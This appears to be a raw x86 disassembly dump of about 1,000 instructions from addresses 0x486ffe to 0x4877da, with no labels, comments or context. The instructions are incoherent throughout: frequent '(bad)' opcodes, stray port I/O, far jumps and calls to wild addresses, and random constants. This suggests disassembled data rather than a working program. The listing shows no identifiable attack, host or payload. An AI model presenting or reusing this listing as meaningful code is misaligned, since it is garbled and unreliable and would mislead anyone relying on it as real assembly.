  486ffe:	or     ah,dh
  487000:	adc    DWORD PTR [ebx-0x29e23dbd],0x97000103
  48700a:	ficom  DWORD PTR [edx+edx*1]
  48700d:	push   cs
  48700e:	adc    DWORD PTR [ebp+0x58],0xffffffdc
  487012:	or     bh,BYTE PTR [eax+0x75759da2]
  487018:	loopne 0x487086
  48701a:	fmul   st(4),st
  48701c:	call   DWORD PTR ds:0xc1f7d344
  487022:	stos   BYTE PTR es:[edi],al
  487023:	push   esp
  487024:	data16 out dx,al
  487026:	mov    DWORD PTR [ebp+0x33b86ab7],ecx
  48702c:	sub    eax,ecx
  48702e:	add    edx,0xd73d10a3
  487034:	jo     0x48708a
  487036:	test   DWORD PTR [edi],ebp
  487038:	mov    esi,?
  48703a:	test   edx,ecx
  48703c:	in     al,0x89
  48703e:	cmp    BYTE PTR [ecx+0x15760470],cl
  487044:	mov    ch,0x69
  487046:	sub    esi,DWORD PTR [eax+0xc9001f4]
  48704c:	cmp    al,0x58
  48704e:	sbb    al,0x87
  487050:	or     esp,esi
  487052:	bound  esi,QWORD PTR [esi]
  487054:	(bad)  
  487055:	scas   eax,DWORD PTR es:[edi]
  487056:	jl     0x487062
  487058:	add    eax,DWORD PTR [esi]
  48705a:	js     0x487053
  48705c:	(bad)  [edi]
  48705e:	mov    edx,0xc07fb958
  487063:	bound  esp,QWORD PTR [esi-0x8]
  487066:	jp     0x48707e
  487068:	dec    edx
  487069:	add    DWORD PTR [esp+ebp*8+0x79],ebx
  48706d:	xor    DWORD PTR [esi],0x94ff6814
  487073:	dec    DWORD PTR [esi]
  487075:	jne    0x48708c
  487077:	retf   0xb9dc
  48707a:	push   esi
  48707b:	adc    edi,ebp
  48707d:	ret    
  48707e:	fwait
  48707f:	adc    eax,0x6a0cc293
  487084:	fadd   QWORD PTR [ebx-0x20]
  487087:	and    edi,DWORD PTR [ebp+0x30]
  48708a:	xor    BYTE PTR [edi-0x6148f0b4],bl
  487090:	fcomp  DWORD PTR [edx+0x77]
  487093:	push   es
  487094:	fbld   TBYTE PTR [eax-0x3b]
  487097:	stc    
  487098:	or     al,BYTE PTR [ecx+0x73]
  48709b:	adc    al,0xda
  48709d:	xor    bl,0x4
  4870a0:	adc    bh,BYTE PTR [edx+0xf]
  4870a3:	(bad)  
  4870a4:	(bad)  
  4870a6:	into   
  4870a7:	xchg   ecx,ebp
  4870a9:	push   edx
  4870aa:	call   0x8dacb0b8
  4870af:	add    BYTE PTR [eax],bh
  4870b1:	cmp    ebx,eax
  4870b3:	inc    esi
  4870b4:	add    DWORD PTR [edx-0x4803e1ed],eax
  4870ba:	adc    eax,0x55c6e0bd
  4870bf:	outs   dx,BYTE PTR ds:[esi]
  4870c0:	mov    DWORD PTR [eax+esi*2],edi
  4870c3:	inc    esi
  4870c4:	int3   
  4870c5:	inc    ebx
  4870c6:	push   cs
  4870c7:	or     al,0x70
  4870c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4870ca:	jbe    0x487082
  4870cc:	xchg   ch,cl
  4870ce:	pop    edx
  4870cf:	mov    ebx,ebp
  4870d1:	stos   DWORD PTR es:[edi],eax
  4870d2:	(bad)  
  4870d3:	pop    edx
  4870d4:	jp     0x487097
  4870d6:	std    
  4870d7:	inc    eax
  4870d8:	or     dh,BYTE PTR [edi+0x50760f14]
  4870de:	or     al,0x38
  4870e0:	add    DWORD PTR [edx+0x20700100],ecx
  4870e6:	pop    esp
  4870e7:	jl     0x4870d3
  4870e9:	(bad)  
  4870ea:	imul   esi,DWORD PTR [edi+0x31],0x2a
  4870ee:	add    eax,0x8394607f
  4870f3:	mov    ecx,es
  4870f5:	push   cs
  4870f6:	mov    ch,0x45
  4870f8:	cmp    eax,0x52bb48c0
  4870fd:	mov    edi,0x8a2bd041
  487102:	mov    ebx,0xce41d78b
  487107:	mov    edi,0x18aafb48
  48710c:	lods   al,BYTE PTR ds:[esi]
  48710d:	fdivr  DWORD PTR [edi+0x10e63947]
  487113:	or     cl,ah
  487115:	ss js  0x4870b8
  487118:	fisub  DWORD PTR [eax]
  48711a:	lea    edi,[ebp+0x15]
  48711d:	pop    ds
  48711e:	jl     0x487174
  487120:	cmp    BYTE PTR [ebx+0x1b],bh
  487123:	cmp    al,0x7c
  487125:	inc    ebp
  487126:	mov    bh,0x78
  487128:	imul   esp,DWORD PTR ss:[edx+edi*1],0x6f
  48712d:	add    eax,0x122734d7
  487132:	mov    DWORD PTR [ebx+edi*1+0x7c004dbe],0x554d2030
  48713d:	pop    ecx
  48713e:	cmp    eax,0xc1f08c15
  487143:	pop    esp
  487144:	push   eax
  487145:	mov    edi,0xca517856
  48714a:	jae    0x487165
  48714c:	fmul   DWORD PTR [ecx+0x57]
  48714f:	inc    ebp
  487150:	pop    eax
  487151:	add    eax,0x90b90260
  487156:	push   edx
  487157:	dec    esp
  487158:	fldz   
  48715a:	cld    
  48715b:	loop   0x487164
  48715d:	shr    DWORD PTR [esi+0x3f],cl
  487160:	push   ds
  487161:	cmp    DWORD PTR [edi],ecx
  487163:	xchg   BYTE PTR [eax+0x5f],dh
  487166:	repnz ss add al,0xe4
  48716a:	addr16 mov edi,0xa95e654b
  487170:	pop    esp
  487171:	and    eax,DWORD PTR ds:0x771a0f70
  487177:	(bad)  
  487178:	push   ds
  487179:	or     eax,0xd10971ab
  48717e:	xchg   esi,eax
  48717f:	cmp    DWORD PTR [eax],eax
  487181:	mov    al,ds:0xe3747fe1
  487186:	cmp    BYTE PTR [ecx],dh
  487188:	xchg   ebp,eax
  487189:	sti    
  48718a:	lds    ecx,FWORD PTR [edi-0x3cbf37c1]
  487190:	addr16 jno 0x487202
  487193:	adc    bh,BYTE PTR [edi-0x23b042b2]
  487199:	cmp    dl,BYTE PTR [bp-0x49]
  48719d:	jne    0x4871a3
  48719f:	pop    esi
  4871a0:	mov    al,0xfa
  4871a2:	repz imul edi,DWORD PTR [esi-0x4f],0xfffffff8
  4871a7:	or     al,0xa
  4871a9:	popa   
  4871aa:	jb     0x4871be
  4871ac:	jp     0x487225
  4871ae:	or     al,0x50
  4871b0:	paddb  mm5,mm1
  4871b3:	addr16 cdq 
  4871b5:	and    BYTE PTR [ebx+eax*2],bl
  4871b8:	jmp    0x487192
  4871ba:	jnp    0x48713f
  4871bc:	stc    
  4871bd:	dec    edi
  4871be:	das    
  4871bf:	xchg   edi,eax
  4871c0:	ins    BYTE PTR es:[edi],dx
  4871c1:	fidiv  DWORD PTR [ecx+0x5f]
  4871c4:	je     0x4871aa
  4871c6:	xor    al,0xe0
  4871c8:	add    dl,ah
  4871ca:	mov    eax,ds:0x99c14d51
  4871cf:	sbb    al,0xa3
  4871d1:	loopne 0x48717b
  4871d3:	js     0x4871b8
  4871d5:	mov    edi,0xf1d0132
  4871da:	stos   DWORD PTR es:[edi],eax
  4871db:	pop    eax
  4871dc:	push   ebx
  4871dd:	mov    eax,ebp
  4871df:	jp     0x487220
  4871e1:	mov    al,0x97
  4871e3:	or     eax,0x19fd8b44
  4871e8:	jl     0x487254
  4871ea:	or     al,BYTE PTR [edx+ebx*2+0x2]
  4871ee:	inc    ebx
  4871ef:	mov    ds:0x8739,eax
  4871f4:	xchg   edi,eax
  4871f5:	and    DWORD PTR [eax+0x48],edx
  4871f8:	arpl   WORD PTR [eax],bx
  4871fa:	enter  0xa4b3,0xa
  4871fe:	push   eax
  4871ff:	inc    ebx
  487200:	loope  0x4871b8
  487202:	pop    es
  487203:	sar    BYTE PTR [ebp+0x4f],cl
  487206:	or     DWORD PTR [ecx+0x42],eax
  487209:	xchg   BYTE PTR [esi+0x1e],bh
  48720c:	test   DWORD PTR [ebx+ebx*4],ebp
  48720f:	iret   
  487210:	repz mov edx,0xdd0642ec
  487216:	mov    cl,0xa
  487218:	sub    ah,bh
  48721a:	jge    0x4871b6
  48721c:	dec    edi
  48721d:	fld    TBYTE PTR [esi+ebp*1+0xd]
  487221:	sub    eax,0x5b062e30
  487226:	mov    eax,ds:0xbda7672d
  48722b:	out    dx,eax
  48722c:	jns    0x4871b2
  48722e:	es data16 aad 0x7f
  487232:	mov    cs,WORD PTR [esi]
  487234:	add    DWORD PTR [ecx],eax
  487236:	add    bh,BYTE PTR [edi+0x66005f6]
  48723c:	push   cs
  48723d:	push   cs
  48723e:	pop    es
  48723f:	push   cs
  487240:	add    DWORD PTR [eax],ecx
  487242:	push   cs
  487243:	or     DWORD PTR [esi],ecx
  487245:	jle    0x487227
  487247:	inc    edi
  487248:	enter  0xe0a,0xb
  48724c:	push   cs
  48724d:	or     al,0xd
  48724f:	inc    DWORD PTR [eax-0x2d]
  487252:	dec    ebx
  487253:	jl     0x4871fc
  487255:	mov    al,ds:0x72084639
  48725a:	add    al,0x64
  48725c:	cmp    eax,0x11302ec2
  487261:	int3   
  487262:	xchg   BYTE PTR [esi-0x58],dh
  487265:	cmp    esi,esp
  487267:	sub    dl,BYTE PTR [eax-0x54]
  48726a:	mov    ebp,0x4edddcd4
  48726f:	cmp    ch,cl
  487271:	xlat   BYTE PTR ds:[ebx]
  487272:	js     0x48720e
  487274:	xor    BYTE PTR [edi+0x5],dl
  487277:	clc    
  487278:	mov    eax,DWORD PTR [esi]
  48727a:	inc    ebx
  48727b:	jecxz  0x487290
  48727d:	fisubr WORD PTR [edx+ebx*1+0x11575001]
  487284:	push   es
  487285:	les    esi,FWORD PTR [ebp-0x17]
  487288:	ja     0x487219
  48728a:	adc    BYTE PTR [ecx+0x10bf5f3e],cl
  487290:	mov    WORD PTR ss:[esi-0x360fcf18],fs
  487297:	pop    ds
  487298:	cld    
  487299:	push   0x3605597c
  48729e:	sub    DWORD PTR [esi],0xf2b04354
  4872a4:	outs   dx,BYTE PTR ds:[esi]
  4872a5:	dec    ebp
  4872a6:	shr    BYTE PTR [esi],0xc5
  4872a9:	lahf   
  4872aa:	jno    0x487263
  4872ac:	adc    al,0x59
  4872ae:	es push ebp
  4872b0:	cld    
  4872b1:	jmp    0x4872b8
  4872b3:	add    BYTE PTR [eax-0x7c],cl
  4872b6:	or     edi,DWORD PTR [edi+0x78bc8fd]
  4872bc:	lea    ecx,[ecx+eax*2]
  4872bf:	sub    al,BYTE PTR [ecx]
  4872c1:	cmp    ax,dx
  4872c4:	je     0x487307
  4872c6:	sub    bl,0x21
  4872c9:	xchg   DWORD PTR [esi],esp
  4872cb:	mov    ds:0xdd5642ef,eax
  4872d0:	xchg   ebp,eax
  4872d1:	js     0x4872bb
  4872d3:	xchg   ebp,eax
  4872d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4872d5:	mov    dl,0x1c
  4872d7:	inc    ecx
  4872d8:	call   DWORD PTR [eax]
  4872da:	loopne 0x48728b
  4872dc:	add    eax,0xff66bc0f
  4872e1:	pop    es
  4872e2:	pushf  
  4872e3:	inc    edx
  4872e4:	mov    edx,DWORD PTR [edi]
  4872e6:	cmp    dl,bl
  4872e8:	sar    DWORD PTR [edi],1
  4872ea:	das    
  4872eb:	push   eax
  4872ec:	add    BYTE PTR [ebp-0x4e],dh
  4872ef:	cmp    BYTE PTR [ebp+0x16],ch
  4872f2:	cmp    DWORD PTR [edx],esi
  4872f4:	xadd   DWORD PTR [esi+0x1],ecx
  4872f8:	or     BYTE PTR [eax+0x40],bh
  4872fb:	jge    0x487285
  4872fd:	xor    al,ch
  4872ff:	(bad)  
  487300:	out    0x9f,al
  487302:	push   0x60
  487304:	mov    ah,0xd3
  487306:	fistp  QWORD PTR gs:[ecx+eax*8]
  48730a:	pop    esi
  48730b:	or     eax,0xc86907b8
  487310:	adc    al,0xe
  487312:	xor    edx,edx
  487314:	sbb    edi,DWORD PTR [esi]
  487316:	call   0xe40d354d
  48731b:	jle    0x487319
  48731d:	adc    BYTE PTR [edi+0x1],dl
  487320:	pop    esi
  487321:	adc    ecx,DWORD PTR [eax]
  487323:	dec    edx
  487324:	rol    DWORD PTR [ebx],0x58
  487327:	mov    al,ds:0xc26406e7
  48732c:	inc    ecx
  48732d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48732e:	inc    edx
  48732f:	pop    edx
  487330:	jbe    0x487353
  487332:	sti    
  487333:	test   al,0x7d
  487335:	shl    BYTE PTR [edx+0x23],0x3a
  487339:	ja     0x487358
  48733b:	push   edx
  48733c:	(bad)  
  48733d:	(bad)  
  48733e:	inc    DWORD PTR [ebx]
  487340:	push   esi
  487341:	cmp    DWORD PTR [ebx],0x4255cae0
  487347:	jmp    0x487322
  487349:	xchg   ecx,eax
  48734a:	in     eax,0xeb
  48734c:	xlat   BYTE PTR ds:[ebx]
  48734d:	fsub   QWORD PTR [edx-0x44]
  487350:	cld    
  487351:	fwait
  487352:	mov    WORD PTR [eax],es
  487354:	je     0x487329
  487356:	div    ebp
  487358:	retf   
  487359:	test   DWORD PTR [ebx],esp
  48735b:	add    DWORD PTR [ebx+ebx*4],eax
  48735e:	jp     0x48738c
  487360:	aam    0xae
  487362:	aaa    
  487363:	mov    esi,0x24909d14
  487368:	push   edx
  487369:	push   eax
  48736a:	push   edx
  48736b:	sub    al,0x21
  48736d:	cmp    BYTE PTR [esi-0x43],dl
  487370:	pop    ss
  487371:	lods   eax,DWORD PTR ds:[esi]
  487372:	je     0x4873b0
  487374:	data16 sti 
  487376:	sub    edi,DWORD PTR [ebx+eiz*8+0x70]
  48737a:	sub    BYTE PTR [ebp+edi*4+0x40facd42],ah
  487381:	setb   BYTE PTR ds:0x8b3632ec
  487388:	adc    edx,edx
  48738a:	push   esi
  48738b:	ror    DWORD PTR [ebx],0x4f
  48738e:	(bad)  
  487390:	rol    BYTE PTR [esi+0x78],1
  487393:	inc    esp
  487394:	retf   0x82bf
  487397:	pop    ebp
  487398:	pop    ss
  487399:	push   eax
  48739a:	pusha  
  48739b:	ror    DWORD PTR [esi-0x77],1
  48739e:	push   ds
  48739f:	enter  0x85c4,0xf9
  4873a3:	sti    
  4873a4:	pop    esi
  4873a5:	loop   0x487382
  4873a7:	js     0x48736f
  4873a9:	sahf   
  4873aa:	jne    0x4873ee
  4873ac:	inc    edx
  4873ad:	xor    edi,edi
  4873af:	cmp    DWORD PTR [edi-0x77],ebx
  4873b2:	push   ds
  4873b3:	add    DWORD PTR [esi-0x32],ebx
  4873b6:	adc    eax,0x20ff438d
  4873bb:	mov    ch,0xac
  4873bd:	push   0xffffffa6
  4873bf:	stos   BYTE PTR es:[edi],al
  4873c0:	xor    al,0x86
  4873c2:	xor    al,0xf3
  4873c4:	mov    ds:0xbf3ffb75,eax
  4873c9:	(bad)  
  4873ca:	jge    0x48736b
  4873cc:	pop    edi
  4873cd:	pop    ebp
  4873ce:	or     DWORD PTR [eax+edi*4+0xa],esi
  4873d2:	sub    al,0x74
  4873d4:	mov    dl,0x3d
  4873d6:	je     0x487384
  4873d8:	clc    
  4873d9:	aas    
  4873da:	aas    
  4873db:	aas    
  4873dc:	sub    BYTE PTR [esi+eiz*4+0x29],dh
  4873e0:	je     0x487382
  4873e2:	pop    ebp
  4873e3:	je     0x48737f
  4873e5:	test   di,di
  4873e8:	je     0x48737f
  4873ea:	mov    ds:0x3abc04d1,al
  4873ef:	arpl   cx,cx
  4873f1:	mov    edi,0xd1f0cc5c
  4873f6:	dec    eax
  4873f7:	mov    ds:0xa9d9d457,eax
  4873fc:	pop    es
  4873fd:	mov    ds:0x9c5c3633,al
  487402:	inc    ebx
  487403:	xor    BYTE PTR [esi+edi*8+0x3587ffd7],al
  48740a:	fst    QWORD PTR [edx]
  48740c:	add    al,0xa4
  48740e:	pop    ss
  48740f:	nop
  487410:	xor    al,0x78
  487412:	jne    0x48743f
  487414:	jo     0x487413
  487416:	inc    ebx
  487417:	mov    ecx,edx
  487419:	mov    eax,edx
  48741b:	adc    bh,al
  48741d:	inc    esi
  48741e:	or     BYTE PTR [ecx],dh
  487420:	je     0x487438
  487422:	push   esi
  487423:	jbe    0x487406
  487425:	push   esi
  487426:	je     0x487453
  487428:	push   cs
  487429:	cmp    dh,BYTE PTR [edi+0x39]
  48742c:	outs   dx,BYTE PTR ds:[esi]
  48742d:	or     al,0x33
  48742f:	clc    
  487430:	xor    bl,dh
  487432:	fidivr DWORD PTR [edi-0x729f33f]
  487438:	and    edx,0xffffffef
  48743b:	or     edx,0x20
  48743e:	mov    DWORD PTR [eax],edx
  487440:	mov    bh,BYTE PTR [edx-0x58]
  487443:	and    BYTE PTR [esi+ebp*1-0x1e],dh
  487447:	inc    ebx
  487448:	push   esp
  487449:	in     eax,0x79
  48744b:	xchg   BYTE PTR [eax+0xc],al
  48744e:	pusha  
  48744f:	push   ecx
  487450:	xchg   DWORD PTR [ebx+0x11],ebp
  487453:	(bad)  
  487454:	sub    DWORD PTR [ebx+0xedff865],eax
  48745a:	loope  0x48743b
  48745c:	mov    edx,0x1f83f0fe
  487461:	bound  ecx,QWORD PTR [ebp+0x5ffaa481]
  487467:	jne    0x487439
  487469:	push   eax
  48746a:	fs xchg edx,eax
  48746c:	test   al,0x10
  48746e:	xor    al,0x8
  487470:	(bad)  
  487471:	fsubr  DWORD PTR [ecx+esi*8-0x3fffb9bf]
  487478:	push   ecx
  487479:	(bad)  
  48747b:	xchg   ecx,eax
  48747c:	lods   eax,DWORD PTR ds:[esi]
  48747d:	jge    0x48748b
  48747f:	test   cl,ch
  487481:	and    DWORD PTR [edi-0x4174cd75],edx
  487487:	aaa    
  487488:	jl     0x487479
  48748a:	retf   
  48748b:	add    ecx,0x83c28064
  487491:	shl    BYTE PTR [edx+edx*8+0x4a64870f],cl
  487498:	jb     0x4874a3
  48749a:	mov    edi,0x98d6bb12
  48749f:	call   DWORD PTR [ecx+ebx*2]
  4874a2:	popa   
  4874a3:	jne    0x4874ad
  4874a5:	inc    ebx
  4874a6:	jle    0x4874f9
  4874a8:	mov    ecx,0xd419ee05
  4874ad:	or     dl,BYTE PTR ds:0x3f8b474e
  4874b3:	push   edi
  4874b4:	xchg   ebx,eax
  4874b5:	inc    esi
  4874b6:	sbb    esp,DWORD PTR [eax+ebp*4-0x74]
  4874ba:	mov    bh,0xc5
  4874bc:	dec    esi
  4874bd:	ins    DWORD PTR es:[edi],dx
  4874be:	lock push eax
  4874c0:	aam    0x78
  4874c2:	pop    edx
  4874c3:	xor    BYTE PTR [esi-0x9],dh
  4874c6:	or     BYTE PTR [esp+ecx*2-0x42],bh
  4874ca:	or     eax,0x243da1a
  4874cf:	and    al,0x78
  4874d1:	push   ss
  4874d2:	add    DWORD PTR [esi+esi*1],edx
  4874d5:	pop    eax
  4874d6:	jne    0xaf3e73c7
  4874dc:	adc    eax,0xf9db635e
  4874e1:	test   eax,0x8090cc4d
  4874e6:	je     0x4874c8
  4874e8:	mov    esp,0x4b86d783
  4874ed:	push   es
  4874ee:	or     dh,dl
  4874f0:	gs push cs
  4874f2:	xor    eax,0x2aec724e
  4874f7:	inc    BYTE PTR [ecx]
  4874f9:	add    al,0x2
  4874fb:	add    DWORD PTR [ebx+eax*1],eax
  4874fe:	add    al,0x99
  487500:	sbb    BYTE PTR [eax+ecx*2+0x5253cc03],0x9
  487508:	sar    DWORD PTR es:[edi+0xf],1
  48750c:	add    al,0xdc
  48750e:	adc    DWORD PTR [esi-0x6b],ebx
  487511:	jo     0x487544
  487513:	dec    edx
  487514:	ret    
  487515:	dec    DWORD PTR [eax]
  487517:	xchg   ecx,eax
  487518:	je     0x487553
  48751a:	xchg   esp,eax
  48751b:	sbb    BYTE PTR [ecx],ah
  48751d:	add    dh,cl
  48751f:	loop   0x4874a5
  487521:	add    al,0x13
  487523:	xor    BYTE PTR [edx],ah
  487525:	test   DWORD PTR [edx+esi*2-0x748d5249],ebp
  48752c:	jo     0x4874bf
  48752e:	ds jmp 0x4874fa
  487531:	cmp    esp,esi
  487533:	ror    DWORD PTR [eax],1
  487535:	fistp  QWORD PTR [eax+0x8c52cac]
  48753b:	not    DWORD PTR [ebp-0x5bc75e3e]
  487541:	push   ebx
  487542:	inc    eax
  487543:	push   esi
  487544:	push   edi
  487545:	mov    ds:0x5f023611,eax
  48754a:	in     al,dx
  48754b:	mov    ecx,DWORD PTR [esi+ecx*2]
  48754e:	adc    esi,DWORD PTR [ebx-0x38d7f1ff]
  487554:	mov    esp,0x6d42cdf
  487559:	adc    al,0x23
  48755b:	push   cs
  48755c:	adc    DWORD PTR [ecx],eax
  48755e:	mov    BYTE PTR [esp+0x13],bl
  487562:	adc    BYTE PTR [edx],dl
  487564:	bound  eax,QWORD PTR [edi]
  487566:	std    
  487567:	or     esp,DWORD PTR [esi]
  487569:	retf   0x8d5c
  48756c:	je     0x487592
  48756e:	sbb    BYTE PTR [ebp-0x7b5447aa],al
  487574:	xchg   esi,eax
  487575:	adc    dl,0x4d
  487578:	sub    al,0x66
  48757a:	into   
  48757b:	cmp    al,0xa8
  48757d:	jnp    0x487582
  48757f:	cmp    al,0xef
  487581:	or     dl,BYTE PTR [edx+0x10]
  487584:	sub    ebx,DWORD PTR [eax]
  487586:	add    dl,bh
  487588:	jo     0x4875c5
  48758a:	lods   eax,DWORD PTR ds:[esi]
  48758b:	cmp    BYTE PTR [edx+ebx*1-0x48],0xe0
  487590:	xor    dl,ch
  487592:	dec    edx
  487593:	pop    eax
  487594:	xor    al,0x1c
  487596:	cwde   
  487597:	inc    esp
  487598:	pop    ecx
  487599:	add    al,0x1a
  48759b:	add    DWORD PTR [ebx-0x7fdccffa],esi
  4875a1:	ins    BYTE PTR es:[edi],dx
  4875a2:	outs   dx,DWORD PTR ds:[esi]
  4875a3:	imul   esp,DWORD PTR ds:0x5074ee7c,0xa8505783
  4875ad:	js     0x4875b3
  4875af:	in     al,dx
  4875b0:	lahf   
  4875b1:	sub    BYTE PTR [ebp+0x2ab42494],cl
  4875b7:	push   cs
  4875b8:	ret    0x6e98
  4875bb:	pushf  
  4875bc:	fnstsw WORD PTR [ebx]
  4875be:	mov    eax,0x2970a850
  4875c3:	add    BYTE PTR [eax],0x56
  4875c6:	pop    ebx
  4875c7:	out    0xfb,eax
  4875c9:	int3   
  4875ca:	sub    cl,BYTE PTR [edx]
  4875cc:	jp     0x487632
  4875ce:	push   eax
  4875cf:	bound  eax,QWORD PTR [edx+eax*1-0x311047f1]
  4875d6:	push   ebp
  4875d7:	inc    edx
  4875d8:	pop    esp
  4875d9:	ins    DWORD PTR es:[edi],dx
  4875da:	mov    WORD PTR [eax],gs
  4875dc:	call   0x3299:0xe534f805
  4875e3:	dec    eax
  4875e4:	or     al,0x28
  4875e7:	cmp    bl,0xe8
  4875ea:	loopne 0x48758d
  4875ec:	lds    edx,FWORD PTR [edx]
  4875ee:	jg     0x48763e
  4875f0:	inc    edx
  4875f1:	mov    ds:0x4c9f6e40,al
  4875f6:	jae    0x487630
  4875f8:	call   0xa6d2c705
  4875fd:	push   esp
  4875fe:	test   al,0x3
  487600:	pop    ebp
  487601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487602:	jge    0x48760e
  487604:	push   0x7a
  487606:	test   al,0x4
  487608:	push   cs
  487609:	push   ebx
  48760a:	pop    esp
  48760b:	push   0x38
  48760d:	pop    ds
  48760e:	pushf  
  48760f:	rcl    BYTE PTR [eax],0x89
  487612:	jmp    0x1b9b:0xa5102432
  487619:	mov    eax,ds:0x1c22c24d
  48761e:	mov    BYTE PTR [eax],bl
  487620:	ret    
  487621:	pop    ebx
  487622:	jno    0x4875fb
  487624:	in     eax,0x39
  487626:	pop    esi
  487627:	jne    0x487683
  487629:	lea    eax,[esp+ebx*2]
  48762c:	in     eax,0x83
  48762e:	inc    ebx
  48762f:	sbb    BYTE PTR [edi-0x2463d8b6],ah
  487635:	xor    ch,BYTE PTR [eax-0x1a]
  487638:	add    BYTE PTR [edi],bl
  48763a:	repnz inc eax
  48763c:	push   edx
  48763d:	push   edi
  48763e:	sub    ch,BYTE PTR [edx]
  487640:	cld    
  487641:	and    al,0xd0
  487643:	mov    DWORD PTR [edi-0x74e98363],eax
  487649:	push   cx
  48764b:	jg     0x4876bc
  48764d:	outs   dx,DWORD PTR ds:[esi]
  48764e:	je     0x4875f2
  487650:	test   BYTE PTR [ebp-0x48],ah
  487653:	pusha  
  487654:	xchg   BYTE PTR [ebp+edi*1-0x2],al
  487658:	pshufw mm1,QWORD PTR [ebx],0x7c
  48765c:	or     ebp,DWORD PTR [edx-0x9]
  48765f:	add    BYTE PTR [ebx+0x3c9e0c03],0xc6
  487666:	lods   al,BYTE PTR ds:[esi]
  487667:	or     BYTE PTR [ebx-0x1],ah
  48766a:	adc    BYTE PTR [esi-0x28dd3e5d],al
  487670:	xor    esi,esi
  487672:	lock mov esi,0x539d749c
  487678:	or     bl,cl
  48767a:	aaa    
  48767b:	repnz call 0xe121:0x19114a22
  487683:	std    
  487684:	div    DWORD PTR [ebx]
  487686:	or     ah,BYTE PTR [edx+0x4bbc3966]
  48768c:	je     0x4876ab
  48768e:	mov    cx,WORD PTR [ebx+edx*1-0x4d4b3310]
  487696:	or     al,0x8c
  487698:	jl     0x4876e0
  48769a:	inc    edi
  48769b:	or     dh,BYTE PTR [edi]
  48769d:	add    BYTE PTR [ebp-0x1d],dh
  4876a0:	jb     0x487652
  4876a2:	int3   
  4876a3:	in     al,dx
  4876a4:	inc    edx
  4876a5:	int3   
  4876a6:	cmp    edx,DWORD PTR [edx+edx*4-0x24f729d7]
  4876ad:	loopne 0x4876ca
  4876af:	shl    BYTE PTR [edi],1
  4876b1:	imul   edi,DWORD PTR [ebp-0xfd67d2d],0x708d417f
  4876bb:	inc    DWORD PTR [ebp-0x14cf870a]
  4876c1:	or     BYTE PTR [ebp-0x70],bh
  4876c4:	push   ds
  4876c5:	add    esi,DWORD PTR [edx]
  4876c7:	and    BYTE PTR [edi+0x645757bc],dl
  4876cd:	(bad)
  4876d0:	push   es
  4876d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4876d2:	mov    ?,esi
  4876d4:	je     0x487680
  4876d6:	lea    ebx,[ebx]
  4876d8:	or     dh,BYTE PTR cs:[ebx]
  4876db:	cmp    dl,BYTE PTR [edx-0x3a]
  4876de:	btr    DWORD PTR [edx+eax*1+0x7e],ecx
  4876e3:	push   ds
  4876e4:	leave  
  4876e5:	outs   dx,BYTE PTR ds:[esi]
  4876e6:	lock xchg ecx,eax
  4876e8:	into   
  4876e9:	test   BYTE PTR [esp+eiz*4+0x1b],dh
  4876ed:	and    eax,0x7f
  4876f0:	scas   al,BYTE PTR es:[edi]
  4876f1:	jne    0x4876e4
  4876f3:	jecxz  0x4876e2
  4876f5:	add    eax,0xdc74758b
  4876fa:	adc    al,BYTE PTR [ecx]
  4876fc:	add    BYTE PTR [ecx+edx*8-0x5d],cl
  487700:	repnz icebp 
  487702:	dec    ecx
  487703:	mov    esp,0x78751828
  487708:	mov    ch,0xd
  48770a:	add    bh,dh
  48770c:	lahf   
  48770d:	test   eax,0x9c1c2ab1
  487712:	add    ebp,ebp
  487714:	add    DWORD PTR [edx-0x59],0xffffffec
  487718:	and    eax,0x5014f6b2
  48771d:	inc    eax
  48771e:	pushf  
  48771f:	popf   
  487720:	ja     0x487706
  487722:	into   
  487723:	and    al,0xb0
  487725:	cmp    esi,DWORD PTR [ecx-0x6e]
  487728:	das    
  487729:	sbb    eax,0xf71de6cf
  48772e:	push   ds
  48772f:	adc    DWORD PTR [ebp+0x130c8a4d],eax
  487735:	shl    ecx,cl
  487737:	mov    ebx,0xce248202
  48773c:	inc    esi
  48773d:	or     ah,BYTE PTR ds:0xbfa653ac
  487743:	jmp    0x8208f79b
  487748:	jb     0x48771c
  48774a:	inc    ecx
  48774b:	add    ecx,DWORD PTR [edx+esi*1-0x40]
  48774f:	imul   esi,DWORD PTR [ebp+eax*8+0x1e783f75],0x8f1ccaf7
  48775a:	push   es
  48775b:	gs mov esi,ebx
  48775e:	(bad)  
  48775f:	mov    WORD PTR [eax+0x6],ds
  487762:	pop    esp
  487763:	adc    DWORD PTR ds:0xaf727bc7,esi
  487769:	inc    BYTE PTR [eax+0x24]
  48776c:	push   esp
  48776d:	xor    eax,0xd5222b6f
  487772:	and    DWORD PTR [ebx+0x15222cc8],0xffffffc4
  487779:	dec    DWORD PTR ds:0x3e456a5d
  48777f:	mov    eax,ds:0x3f18f75f
  487784:	outs   dx,BYTE PTR ds:[esi]
  487785:	pop    esi
  487786:	scas   al,BYTE PTR es:[edi]
  487787:	nop
  487788:	push   es
  487789:	inc    edi
  48778a:	ret    
  48778b:	cs pop es
  48778d:	mov    DWORD PTR [edi+0x6],0x2bbf02e1
  487794:	(bad)  
  487795:	fdivp  st(6),st
  487797:	lds    esi,FWORD PTR ss:[eax]
  48779a:	pop    edx
  48779b:	mov    DWORD PTR [eax],ecx
  48779d:	ror    cl,0x2e
  4877a0:	fwait
  4877a1:	cmp    eax,DWORD PTR es:[eax]
  4877a4:	push   es
  4877a5:	cmp    dl,dl
  4877a7:	dec    esi
  4877a8:	or     BYTE PTR [edi],ch
  4877aa:	sbb    al,BYTE PTR [esi]
  4877ac:	push   eax
  4877ad:	loopne 0x48781e
  4877af:	pusha  
  4877b0:	mov    cl,BYTE PTR [eax+edx*1]
  4877b3:	mov    BYTE PTR [ebp+ebx*1-0x1],cl
  4877b7:	nop
  4877b8:	cmp    bl,dl
  4877ba:	(bad)  
  4877bb:	adc    eax,0xdd723a9b
  4877c0:	sbb    al,0x1
  4877c2:	pop    esi
  4877c3:	adc    BYTE PTR [ecx],dl
  4877c5:	dec    esi
  4877c6:	adc    al,0x3b
  4877c8:	(bad)  [esp+ebp*8+0x2e]
  4877cc:	mov    ebx,0x5d8af4dd
  4877d1:	jmp    FWORD PTR [edx+0xd]
  4877d4:	je     0x48780c
  4877d6:	or     BYTE PTR [edx],cl
  4877d8:	je     0x487827
  4877da:	iret   
